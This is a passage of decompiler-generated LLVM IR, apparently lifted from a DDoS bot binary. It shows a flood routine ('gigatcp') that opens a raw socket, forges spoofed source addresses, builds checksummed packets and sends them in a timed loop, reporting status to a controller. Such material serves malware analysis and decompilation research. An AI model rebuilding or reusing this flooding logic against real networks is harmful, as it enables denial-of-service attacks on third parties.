  %v2_804e588 = ptrtoint i16* %stack_var_-160 to i32
  %v2_804e58e = ptrtoint i32* %stack_var_-148 to i32
  %v15_804e594 = ptrtoint i16* %stack_var_-88 to i32
  %v12_804e5b2 = ptrtoint i32* %stack_var_-128 to i32
  %v15_804e5b9 = ptrtoint i32* %stack_var_-68 to i32
  %v2_804e5df = ptrtoint i32* %stack_var_-176 to i32
  %v5_804e61b = add i32 %v1_804e37a, %v2_804e2c3
  br label %dec_label_pc_804e479

dec_label_pc_804e479:                             ; preds = %dec_label_pc_804e633, %dec_label_pc_804e354
  %v0_804e481 = phi i32 [ %v15_804e28c, %dec_label_pc_804e354 ], [ %v0_804e481.pre, %dec_label_pc_804e633 ]
  %stack_var_-36.0 = phi i16 [ %v5_804e453, %dec_label_pc_804e354 ], [ %stack_var_-36.1, %dec_label_pc_804e633 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_804e354 ], [ %v4_804e633, %dec_label_pc_804e633 ]
  %v2_804e47f = load i32, i32* %v1_804e42f, align 4
  %v2_804e484 = add i32 %v0_804e481, -16
  %v3_804e484 = inttoptr i32 %v2_804e484 to i32*
  store i32 %v2_804e47f, i32* %v3_804e484, align 4
  %v0_804e485 = load i32, i32* %stack_var_-284, align 4
  %v1_804e485 = call i32 @atol(i32 %v0_804e485)
  %v1_804e48d = icmp eq i32 %v1_804e485, 0
  %v1_804e48f = icmp eq i1 %v1_804e48d, false
  br i1 %v1_804e48f, label %dec_label_pc_804e499, label %dec_label_pc_804e491

dec_label_pc_804e491:                             ; preds = %dec_label_pc_804e479
  %v0_804e491 = call i32 @random()
  %v1_804e491 = trunc i32 %v0_804e491 to i16
  br label %dec_label_pc_804e499

dec_label_pc_804e499:                             ; preds = %dec_label_pc_804e479, %dec_label_pc_804e491
  %stack_var_-36.1 = phi i16 [ %stack_var_-36.0, %dec_label_pc_804e479 ], [ %v1_804e491, %dec_label_pc_804e491 ]
  %v1_804e499 = sext i16 %stack_var_-36.1 to i32
  %v2_804e499 = call i32 @getspoof(i32 %v1_804e499)
  %v3_804e499 = trunc i32 %v2_804e499 to i16
  %v0_804e4ac = load i32, i32* @esp, align 4
  %v2_804e4af = add i32 %v0_804e4ac, -16
  %v3_804e4af = inttoptr i32 %v2_804e4af to i32*
  store i32 60, i32* %v3_804e4af, align 4
  %sext12 = mul i32 %v2_804e499, 65536
  %v1_804e4b0 = sdiv i32 %sext12, 65536
  %v2_804e4b0 = call i32 @htons(i32 %v1_804e4b0)
  %v1_804e4bc = call i32 @random()
  store i16 %v3_804e499, i16* %stack_var_-88, align 2
  %v1_804e4df = call i32 @random()
  %v0_804e4fd = load i32, i32* @esp, align 4
  %v1_804e4fd = add i32 %v0_804e4fd, -4
  %v2_804e4fd = inttoptr i32 %v1_804e4fd to i32*
  store i32 20, i32* %v2_804e4fd, align 4
  %v2_804e4ff = add i32 %v0_804e4fd, -8
  %v3_804e4ff = inttoptr i32 %v2_804e4ff to i32*
  store i32 %v2_804e4fa, i32* %v3_804e4ff, align 4
  %v3_804e500 = inttoptr i32 %v1_804e499 to i16*
  %v4_804e500 = call i32 @in_cksum(i16* %v3_804e500, i32 %v2_804e363)
  %v1_804e50c = call i32 @random()
  store i16 %v3_804e499, i16* %stack_var_-160, align 2
  %v0_804e575 = load i32, i32* @esp, align 4
  %v2_804e578 = add i32 %v0_804e575, -16
  %v3_804e578 = inttoptr i32 %v2_804e578 to i32*
  store i32 40, i32* %v3_804e578, align 4
  %sext24 = mul i32 %v1_804e50c, 16777216
  %v1_804e579 = sdiv i32 %sext24, 16777216
  %v2_804e579 = call i32 @htons(i32 %v1_804e579)
  %v0_804e57e = load i32, i32* @esp, align 4
  store i32 %v2_804e58e, i32* %edx.global-to-local, align 4
  %v1_804e59a = add i32 %v0_804e57e, 8
  %v2_804e59a = inttoptr i32 %v1_804e59a to i32*
  store i32 20, i32* %v2_804e59a, align 4
  %v2_804e59c = add i32 %v0_804e57e, 4
  %v3_804e59c = inttoptr i32 %v2_804e59c to i32*
  store i32 %v2_804e58e, i32* %v3_804e59c, align 4
  %v3_804e59d = inttoptr i32 %v0_804e57e to i32*
  store i32 %v15_804e594, i32* %v3_804e59d, align 4
  %sext16 = mul i32 %v2_804e579, 65536
  %v1_804e59e = sdiv i32 %sext16, 65536
  %v4_804e59e = call i32 @bcopy(i32 %v1_804e59e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e5a3 = load i32, i32* @esp, align 4
  %v5_804e5a9 = add i32 %v0_804e5a3, 8
  %v6_804e5a9 = inttoptr i32 %v5_804e5a9 to i32*
  store i32 20, i32* %v6_804e5a9, align 4
  %v2_804e5b5 = add i32 %v0_804e5a3, 4
  %v3_804e5b5 = inttoptr i32 %v2_804e5b5 to i32*
  store i32 %v12_804e5b2, i32* %v3_804e5b5, align 4
  %v3_804e5bc = inttoptr i32 %v0_804e5a3 to i32*
  store i32 %v15_804e5b9, i32* %v3_804e5bc, align 4
  %v4_804e5bd = call i32 @bcopy(i32 %v1_804e59e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e5c2 = load i32, i32* @esp, align 4
  store i32 %v2_804e588, i32* %edx.global-to-local, align 4
  %v2_804e5d1 = add i32 %v0_804e5c2, 12
  %v3_804e5d1 = inttoptr i32 %v2_804e5d1 to i32*
  store i32 52, i32* %v3_804e5d1, align 4
  %v2_804e5d2 = add i32 %v0_804e5c2, 8
  %v3_804e5d2 = inttoptr i32 %v2_804e5d2 to i32*
  store i32 %v2_804e588, i32* %v3_804e5d2, align 4
  %v3_804e5d3 = inttoptr i32 %v1_804e59e to i16*
  %v4_804e5d3 = call i32 @in_cksum(i16* %v3_804e5d3, i32 ptrtoint (i32* @0 to i32))
  %v0_804e5d8 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v1_804e5ee = add i32 %v0_804e5d8, -4
  %v2_804e5ee = inttoptr i32 %v1_804e5ee to i32*
  store i32 16, i32* %v2_804e5ee, align 4
  %v2_804e5f0 = add i32 %v0_804e5d8, -8
  %v3_804e5f0 = inttoptr i32 %v2_804e5f0 to i32*
  store i32 %v2_804e5df, i32* %v3_804e5f0, align 4
  %v1_804e5f1 = add i32 %v0_804e5d8, -12
  %v2_804e5f1 = inttoptr i32 %v1_804e5f1 to i32*
  store i32 0, i32* %v2_804e5f1, align 4
  %v0_804e5f3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e5f3 = add i32 %v0_804e5d8, -16
  %v3_804e5f3 = inttoptr i32 %v2_804e5f3 to i32*
  store i32 %v0_804e5f3, i32* %v3_804e5f3, align 4
  %v2_804e5f7 = add i32 %v0_804e5d8, -20
  %v3_804e5f7 = inttoptr i32 %v2_804e5f7 to i32*
  store i32 %v2_804e4fa, i32* %v3_804e5f7, align 4
  %v5_804e5f8 = add i32 %v0_804e5d8, -24
  %v6_804e5f8 = inttoptr i32 %v5_804e5f8 to i32*
  store i32 %v3_804e2f0, i32* %v6_804e5f8, align 4
  %v1_804e5fb = load i32, i32* %stack_var_-68, align 4
  %sext19 = mul i32 %v4_804e5d3, 65536
  %v2_804e5fb = sdiv i32 %sext19, 65536
  %v7_804e5fb = call i32 @sendto(i32 %v2_804e5fb, i32 %v1_804e5fb, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804e600 = load i32, i32* @esp, align 4
  %v1_804e600 = add i32 %v0_804e600, 32
  %tmp85 = icmp ult i32 %stack_var_-48.0, 100
  br i1 %tmp85, label %dec_label_pc_804e633, label %dec_label_pc_804e609

dec_label_pc_804e609:                             ; preds = %dec_label_pc_804e499
  %v1_804e60c = add i32 %v0_804e600, 16
  %v2_804e60c = inttoptr i32 %v1_804e60c to i32*
  store i32 0, i32* %v2_804e60c, align 4
  %v2_804e60e = inttoptr i32 %v2_804e5fb to i32*
  %v3_804e60e = call i32 @__GI_time(i32* %v2_804e60e)
  %v0_804e613 = load i32, i32* @esp, align 4
  %v1_804e613 = add i32 %v0_804e613, 16
  store i32 %v3_804e60e, i32* %edx.global-to-local, align 4
  %v7_804e61e = icmp ult i32 %v3_804e60e, %v5_804e61b
  br i1 %v7_804e61e, label %dec_label_pc_804e633, label %dec_label_pc_804e622

dec_label_pc_804e622:                             ; preds = %dec_label_pc_804e609
  %v2_804e625 = inttoptr i32 %v0_804e613 to i32*
  store i32 0, i32* %v2_804e625, align 4
  %v2_804e627 = call i32 @__GI_exit(i32 %v2_804e5fb)
  %v0_804e481.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e633

dec_label_pc_804e633:                             ; preds = %dec_label_pc_804e622, %dec_label_pc_804e609, %dec_label_pc_804e499
  %v0_804e481.pre = phi i32 [ %v1_804e600, %dec_label_pc_804e499 ], [ %v1_804e613, %dec_label_pc_804e609 ], [ %v0_804e481.pre.pre, %dec_label_pc_804e622 ]
  %stack_var_-48.1 = phi i32 [ %stack_var_-48.0, %dec_label_pc_804e499 ], [ 0, %dec_label_pc_804e609 ], [ 0, %dec_label_pc_804e622 ]
  %v4_804e633 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_804e479

dec_label_pc_804e63b:                             ; preds = %entry
  ret i32 %v1_804e2d4

; uselistorder directives
  uselistorder i32 %v2_804e5fb, { 2, 1, 0 }
  uselistorder i32 %v0_804e5a3, { 1, 0, 2 }
  uselistorder i32 %v1_804e59e, { 2, 1, 0 }
  uselistorder i32 %v0_804e57e, { 2, 0, 1 }
  uselistorder i16 %stack_var_-36.1, { 1, 0 }
  uselistorder i32 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v2_804e46a, { 1, 0 }
  uselistorder i32 %v2_804e42f, { 1, 0 }
  uselistorder i32 %v2_804e374, { 1, 0 }
  uselistorder i32 %storemerge84, { 2, 3, 0, 1 }
  uselistorder i32 %v4_804e30b, { 1, 0 }
  uselistorder i16* %stack_var_-160, { 1, 0 }
  uselistorder i16* %stack_var_-88, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e499, { 1, 0 }
  uselistorder label %dec_label_pc_804e33a, { 1, 0 }
  uselistorder label %dec_label_pc_804e34e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e30b, { 1, 0 }
}

define i32 @gigatcp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp118 = call i8 @__decompiler_undefined_function_5()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-100 = alloca i16, align 2
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i16, align 2
  %stack_var_-120 = alloca i8, align 1
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-540 = alloca i32, align 4
  %v2_804e64b = ptrtoint i32* %stack_var_-268 to i32
  store i32 ptrtoint (i32* @global_var_8069920.189 to i32), i32* %edx.global-to-local, align 4
  %v5_804e65b = icmp ult i32* %stack_var_-540, inttoptr (i32 4 to i32*)
  store i1 %v5_804e65b, i1* %cf.global-to-local, align 1
  store i32 %v2_804e64b, i32* %stack_var_-556, align 4
  %v3_804e661 = bitcast i32* %stack_var_-268 to i16*
  %v4_804e661 = call i32 @memcpy(i16* %v3_804e661, i32 ptrtoint (i32* @global_var_8069920.189 to i32), i32 80)
  %v2_804e677 = ptrtoint i32* %stack_var_-396 to i32
  store i32 ptrtoint (i32* @global_var_80698a0.190 to i32), i32* %edx.global-to-local, align 4
  store i1 %v5_804e65b, i1* %cf.global-to-local, align 1
  store i32 %v2_804e677, i32* %stack_var_-556, align 4
  %v3_804e68d = bitcast i32* %stack_var_-396 to i16*
  %v4_804e68d = call i32 @memcpy(i16* %v3_804e68d, i32 ptrtoint (i32* @global_var_80698a0.190 to i32), i32 124)
  %v5_804e69c = icmp ult i32* %stack_var_-540, inttoptr (i32 12 to i32*)
  store i1 %v5_804e69c, i1* %cf.global-to-local, align 1
  store i32 0, i32* %stack_var_-556, align 4
  %v2_804e6a1 = call i32 @__GI_time(i32* null)
  store i32 %v2_804e6a1, i32* @eax, align 4
  store i1 %v5_804e69c, i1* %cf.global-to-local, align 1
  store i32 %arg2, i32* %stack_var_-556, align 4
  %v1_804e6b2 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e6ba = icmp eq i32 %v1_804e6b2, 0
  %v1_804e6bc = icmp eq i1 %v1_804e6ba, false
  br i1 %v1_804e6bc, label %dec_label_pc_804ee38, label %dec_label_pc_804e6c2

dec_label_pc_804e6c2:                             ; preds = %entry
  store i1 %v5_804e65b, i1* %cf.global-to-local, align 1
  store i32 2, i32* %stack_var_-556, align 4
  %v3_804e6ce = call i32 @socket(i32 2, i32 3, i32 255)
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e6d9 = icmp slt i32 %v3_804e6ce, 0
  %v1_804e6dd = icmp eq i1 %v5_804e6d9, false
  br i1 %v1_804e6dd, label %dec_label_pc_804e6e9, label %dec_label_pc_804e6df

dec_label_pc_804e6df:                             ; preds = %dec_label_pc_804e6c2
  store i1 %v5_804e69c, i1* %cf.global-to-local, align 1
  store i32 1, i32* %stack_var_-556, align 4
  %v1_804e6e4 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e6e9

dec_label_pc_804e6e9:                             ; preds = %dec_label_pc_804e6c2, %dec_label_pc_804e6df
  %v4_804e6e9 = add i32 %arg3, -2
  %v8_804e6e9 = icmp ult i32 %arg3, 2
  %v9_804e6e9 = sub i32 1, %arg3
  %v10_804e6e9 = and i32 %v9_804e6e9, %arg3
  %v11_804e6e9 = icmp slt i32 %v10_804e6e9, 0
  store i1 %v8_804e6e9, i1* %cf.global-to-local, align 1
  %v12_804e6e9 = icmp eq i32 %v4_804e6e9, 0
  %v13_804e6e9 = icmp slt i32 %v4_804e6e9, 0
  %v3_804e6ed = icmp eq i1 %v13_804e6e9, %v11_804e6e9
  %v4_804e6ed = icmp eq i1 %v12_804e6e9, false
  %v5_804e6ed = and i1 %v4_804e6ed, %v3_804e6ed
  br i1 %v5_804e6ed, label %dec_label_pc_804e72c.preheader, label %dec_label_pc_804e6ef

dec_label_pc_804e6ef:                             ; preds = %dec_label_pc_804e6e9
  %v0_804e6ef = load i32, i32* @esp, align 4
  %v5_804e6ef = icmp ult i32 %v0_804e6ef, 4
  store i1 %v5_804e6ef, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-556, align 4
  %v2_804e6fd = call i32 @Send(i32 %arg1, i32 ptrtoint ([45 x i8]* @global_var_8069970.191 to i32))
  store i1 %v5_804e69c, i1* %cf.global-to-local, align 1
  store i32 1, i32* %stack_var_-556, align 4
  %v1_804e70a = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804e72c.preheader

dec_label_pc_804e72c.preheader:                   ; preds = %dec_label_pc_804e6e9, %dec_label_pc_804e6ef
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e718

dec_label_pc_804e718:                             ; preds = %dec_label_pc_804e72c.preheader, %dec_label_pc_804e718
  %storemerge166 = phi i32 [ 0, %dec_label_pc_804e72c.preheader ], [ %v4_804e729, %dec_label_pc_804e718 ]
  store i32 %storemerge166, i32* @edx, align 4
  %v0_804e71e = load i32, i32* @ebp, align 4
  %v2_804e71e = mul nuw nsw i32 %storemerge166, 4
  %v3_804e71e = add nuw nsw i32 %v2_804e71e, -264
  %v4_804e71e = add i32 %v3_804e71e, %v0_804e71e
  %v5_804e71e = inttoptr i32 %v4_804e71e to i32*
  %v6_804e71e = load i32, i32* %v5_804e71e, align 4
  %v1_804e725 = trunc i32 %v6_804e71e to i8
  %v4_804e725 = add nuw nsw i32 %storemerge166, -76
  %v5_804e725 = add i32 %v4_804e725, %v0_804e71e
  %v6_804e725 = inttoptr i32 %v5_804e725 to i8*
  store i8 %v1_804e725, i8* %v6_804e725, align 1
  %v4_804e729 = add nuw nsw i32 %storemerge166, 1
  %v9_804e72c = icmp ult i32 %v4_804e729, 19
  store i1 %v9_804e72c, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804e729, 20
  br i1 %exitcond, label %dec_label_pc_804e732, label %dec_label_pc_804e718

dec_label_pc_804e732:                             ; preds = %dec_label_pc_804e718
  %v1_804e735 = add i32 %arg4, 4
  %v1_804e738 = inttoptr i32 %v1_804e735 to i32*
  %v2_804e738 = load i32, i32* %v1_804e738, align 4
  %v0_804e73a = load i32, i32* @esp, align 4
  %v5_804e73a = icmp ult i32 %v0_804e73a, 8
  store i1 %v5_804e73a, i1* %cf.global-to-local, align 1
  %v2_804e741 = call i32 @host2ip(i32 %arg2, i32 %v2_804e738)
  %v1_804e74f = add i32 %arg4, 12
  %v1_804e752 = inttoptr i32 %v1_804e74f to i32*
  %v2_804e752 = load i32, i32* %v1_804e752, align 4
  %v5_804e754 = icmp ult i32* %stack_var_-556, inttoptr (i32 12 to i32*)
  store i1 %v5_804e754, i1* %cf.global-to-local, align 1
  %v1_804e758 = call i32 @atol(i32 %v2_804e752)
  %v1_804e766 = add i32 %arg4, 8
  %v5_804e766 = icmp ugt i32 %arg4, -9
  %v1_804e769 = inttoptr i32 %v1_804e766 to i32*
  %v2_804e769 = load i32, i32* %v1_804e769, align 4
  store i32 %v2_804e769, i32* %edx.global-to-local, align 4
  store i1 %v5_804e754, i1* %cf.global-to-local, align 1
  %v3_804e783 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_80699a0.192 to i32))
  store i32 2, i32* %stack_var_-188, align 4
  store i8 69, i8* %stack_var_-120, align 1
  %v1_804e80a = and i8 %tmp118, -64
  store i1 %v5_804e766, i1* %cf.global-to-local, align 1
  %v2_804e81c = load i32, i32* %v1_804e769, align 4
  store i1 false, i1* @df, align 1
  %v4_804e839 = inttoptr i32 %v2_804e81c to i8*
  store i32 %v2_804e81c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80699e1.193 to i32), i32* @edi, align 4
  %v7_804e84b = call i32 @_strncmp(i8* %v4_804e839, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80699e1.193, i32 0, i32 0), i32 4)
  %v8_804e84b = urem i32 %v7_804e84b, 2
  %v9_804e84b = icmp eq i32 %v8_804e84b, 0
  %v0_804e84d = load i1, i1* %cf.global-to-local, align 1
  %v2_804e84d = or i1 %v0_804e84d, %v9_804e84b
  %v3_804e84d = zext i1 %v2_804e84d to i32
  %v4_804e84d = load i32, i32* @edx, align 4
  %v5_804e84d = and i32 %v4_804e84d, -256
  %v6_804e84d = or i32 %v3_804e84d, %v5_804e84d
  %v7_804e84d = xor i32 %v6_804e84d, 1
  store i32 %v7_804e84d, i32* %edx.global-to-local, align 4
  %v1_804e855 = trunc i32 %v7_804e84d to i8
  %v3_804e855 = zext i1 %v0_804e84d to i8
  %v15_804e855 = icmp eq i8 %v1_804e855, %v3_804e855
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e85e = icmp eq i1 %v15_804e855, false
  br i1 %v1_804e85e, label %dec_label_pc_804e89b, label %dec_label_pc_804e860

dec_label_pc_804e860:                             ; preds = %dec_label_pc_804e732
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec5b

dec_label_pc_804e89b:                             ; preds = %dec_label_pc_804e732
  store i1 %v5_804e766, i1* %cf.global-to-local, align 1
  %v2_804e8a1 = load i32, i32* %v1_804e769, align 4
  store i1 false, i1* @df, align 1
  %v4_804e8be = inttoptr i32 %v2_804e8a1 to i8*
  store i32 %v2_804e8a1, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80699e5.194 to i32), i32* @edi, align 4
  %v7_804e8d0 = call i32 @_strncmp(i8* %v4_804e8be, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80699e5.194, i32 0, i32 0), i32 5)
  %v8_804e8d0 = urem i32 %v7_804e8d0, 2
  %v9_804e8d0 = icmp eq i32 %v8_804e8d0, 0
  %v0_804e8d2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e8d2 = or i1 %v0_804e8d2, %v9_804e8d0
  %v3_804e8d2 = zext i1 %v2_804e8d2 to i32
  %v4_804e8d2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e8d2 = and i32 %v4_804e8d2, -256
  %v6_804e8d2 = or i32 %v3_804e8d2, %v5_804e8d2
  %v7_804e8d2 = xor i32 %v6_804e8d2, 1
  store i32 %v7_804e8d2, i32* %edx.global-to-local, align 4
  %v1_804e8da = trunc i32 %v7_804e8d2 to i8
  %v3_804e8da = zext i1 %v0_804e8d2 to i8
  %v15_804e8da = icmp eq i8 %v1_804e8da, %v3_804e8da
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e8e3 = icmp eq i1 %v15_804e8da, false
  br i1 %v1_804e8e3, label %dec_label_pc_804e905, label %dec_label_pc_804e8e5

dec_label_pc_804e8e5:                             ; preds = %dec_label_pc_804e89b
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec5b

dec_label_pc_804e905:                             ; preds = %dec_label_pc_804e89b
  store i1 %v5_804e766, i1* %cf.global-to-local, align 1
  %v2_804e90b = load i32, i32* %v1_804e769, align 4
  store i1 false, i1* @df, align 1
  %v4_804e928 = inttoptr i32 %v2_804e90b to i8*
  store i32 %v2_804e90b, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80699ea.195 to i32), i32* @edi, align 4
  %v7_804e93a = call i32 @_strncmp(i8* %v4_804e928, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80699ea.195, i32 0, i32 0), i32 5)
  %v8_804e93a = urem i32 %v7_804e93a, 2
  %v9_804e93a = icmp eq i32 %v8_804e93a, 0
  %v0_804e93c = load i1, i1* %cf.global-to-local, align 1
  %v2_804e93c = or i1 %v0_804e93c, %v9_804e93a
  %v3_804e93c = zext i1 %v2_804e93c to i32
  %v4_804e93c = load i32, i32* %edx.global-to-local, align 4
  %v5_804e93c = and i32 %v4_804e93c, -256
  %v6_804e93c = or i32 %v3_804e93c, %v5_804e93c
  %v7_804e93c = xor i32 %v6_804e93c, 1
  store i32 %v7_804e93c, i32* %edx.global-to-local, align 4
  %v1_804e944 = trunc i32 %v7_804e93c to i8
  %v3_804e944 = zext i1 %v0_804e93c to i8
  %v15_804e944 = icmp eq i8 %v1_804e944, %v3_804e944
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e94d = icmp eq i1 %v15_804e944, false
  br i1 %v1_804e94d, label %dec_label_pc_804e966, label %dec_label_pc_804e94f

dec_label_pc_804e94f:                             ; preds = %dec_label_pc_804e905
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec5b

dec_label_pc_804e966:                             ; preds = %dec_label_pc_804e905
  store i1 %v5_804e766, i1* %cf.global-to-local, align 1
  %v2_804e96c = load i32, i32* %v1_804e769, align 4
  store i1 false, i1* @df, align 1
  %v4_804e989 = inttoptr i32 %v2_804e96c to i8*
  store i32 %v2_804e96c, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80699ef.196 to i32), i32* @edi, align 4
  %v7_804e99b = call i32 @_strncmp(i8* %v4_804e989, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80699ef.196, i32 0, i32 0), i32 7)
  %v8_804e99b = urem i32 %v7_804e99b, 2
  %v9_804e99b = icmp eq i32 %v8_804e99b, 0
  %v0_804e99d = load i1, i1* %cf.global-to-local, align 1
  %v2_804e99d = or i1 %v0_804e99d, %v9_804e99b
  %v3_804e99d = zext i1 %v2_804e99d to i32
  %v4_804e99d = load i32, i32* %edx.global-to-local, align 4
  %v5_804e99d = and i32 %v4_804e99d, -256
  %v6_804e99d = or i32 %v3_804e99d, %v5_804e99d
  %v7_804e99d = xor i32 %v6_804e99d, 1
  store i32 %v7_804e99d, i32* %edx.global-to-local, align 4
  %v1_804e9a5 = trunc i32 %v7_804e99d to i8
  %v3_804e9a5 = zext i1 %v0_804e99d to i8
  %v15_804e9a5 = icmp eq i8 %v1_804e9a5, %v3_804e9a5
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e9ae = icmp eq i1 %v15_804e9a5, false
  br i1 %v1_804e9ae, label %dec_label_pc_804e9c7, label %dec_label_pc_804e9b0

dec_label_pc_804e9b0:                             ; preds = %dec_label_pc_804e966
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec5b

dec_label_pc_804e9c7:                             ; preds = %dec_label_pc_804e966
  store i1 %v5_804e766, i1* %cf.global-to-local, align 1
  %v2_804e9cd = load i32, i32* %v1_804e769, align 4
  store i1 false, i1* @df, align 1
  %v4_804e9ea = inttoptr i32 %v2_804e9cd to i8*
  store i32 %v2_804e9cd, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_80699f6.197 to i32), i32* @edi, align 4
  %v7_804e9fc = call i32 @_strncmp(i8* %v4_804e9ea, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80699f6.197, i32 0, i32 0), i32 8)
  %v8_804e9fc = urem i32 %v7_804e9fc, 2
  %v9_804e9fc = icmp eq i32 %v8_804e9fc, 0
  %v0_804e9fe = load i1, i1* %cf.global-to-local, align 1
  %v2_804e9fe = or i1 %v0_804e9fe, %v9_804e9fc
  %v3_804e9fe = zext i1 %v2_804e9fe to i32
  %v4_804e9fe = load i32, i32* %edx.global-to-local, align 4
  %v5_804e9fe = and i32 %v4_804e9fe, -256
  %v6_804e9fe = or i32 %v3_804e9fe, %v5_804e9fe
  %v7_804e9fe = xor i32 %v6_804e9fe, 1
  store i32 %v7_804e9fe, i32* @edx, align 4
  %v3_804ea04 = and i32 %v7_804e9fc, -256
  %v1_804ea06 = trunc i32 %v7_804e9fe to i8
  %v3_804ea06 = zext i1 %v0_804e9fe to i8
  %v4_804ea06 = sub nsw i8 %v1_804ea06, %v3_804ea06
  %v15_804ea06 = icmp eq i8 %v4_804ea06, 0
  %v20_804ea06 = zext i8 %v4_804ea06 to i32
  %v23_804ea06 = or i32 %v20_804ea06, %v3_804ea04
  store i32 %v23_804ea06, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ea0f = icmp eq i1 %v15_804ea06, false
  br i1 %v1_804ea0f, label %dec_label_pc_804ea31, label %dec_label_pc_804ea11

dec_label_pc_804ea11:                             ; preds = %dec_label_pc_804e9c7
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804ec5b

dec_label_pc_804ea31:                             ; preds = %dec_label_pc_804e9c7
  %v2_804ea37 = load i32, i32* %v1_804e769, align 4
  store i32 %v2_804ea37, i32* @eax, align 4
  %v0_804ea39 = load i32, i32* @esp, align 4
  %v5_804ea39 = icmp ult i32 %v0_804ea39, 8
  store i1 %v5_804ea39, i1* %cf.global-to-local, align 1
  %v2_804ea42 = call i32 @__GI_strtok(i32 %v2_804ea37, i32 ptrtoint (i32* @global_var_80699fe.198 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804ec5147 = icmp eq i32 %v2_804ea42, 0
  %v1_804ec5554 = icmp eq i1 %v5_804ec5147, false
  br i1 %v1_804ec5554, label %dec_label_pc_804ea52, label %dec_label_pc_804ec5b

dec_label_pc_804ea52:                             ; preds = %dec_label_pc_804ea31, %dec_label_pc_804ec3c
  %v3_804ebee.in = phi i32 [ %v2_804ec46, %dec_label_pc_804ec3c ], [ %v2_804ea42, %dec_label_pc_804ea31 ]
  %stack_var_-87.155 = phi i8 [ %stack_var_-87.0, %dec_label_pc_804ec3c ], [ %v1_804e80a, %dec_label_pc_804ea31 ]
  %v3_804ebee = inttoptr i32 %v3_804ebee.in to i8*
  store i1 false, i1* @df, align 1
  store i32 %v3_804ebee.in, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8069a00.199 to i32), i32* @edi, align 4
  %v7_804ea82 = call i32 @_strncmp(i8* %v3_804ebee, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8069a00.199, i32 0, i32 0), i32 4)
  %v8_804ea82 = urem i32 %v7_804ea82, 2
  %v9_804ea82 = icmp eq i32 %v8_804ea82, 0
  %v0_804ea84 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ea84 = or i1 %v0_804ea84, %v9_804ea82
  %v3_804ea84 = zext i1 %v2_804ea84 to i32
  %v4_804ea84 = load i32, i32* @edx, align 4
  %v5_804ea84 = and i32 %v4_804ea84, -256
  %v6_804ea84 = or i32 %v3_804ea84, %v5_804ea84
  %v7_804ea84 = xor i32 %v6_804ea84, 1
  store i32 %v7_804ea84, i32* @edx, align 4
  %v3_804ea8a = and i32 %v7_804ea82, -256
  %v1_804ea8c = trunc i32 %v7_804ea84 to i8
  %v3_804ea8c = zext i1 %v0_804ea84 to i8
  %v4_804ea8c = sub nsw i8 %v1_804ea8c, %v3_804ea8c
  %v15_804ea8c = icmp eq i8 %v4_804ea8c, 0
  %v20_804ea8c = zext i8 %v4_804ea8c to i32
  %v23_804ea8c = or i32 %v20_804ea8c, %v3_804ea8a
  store i32 %v23_804ea8c, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
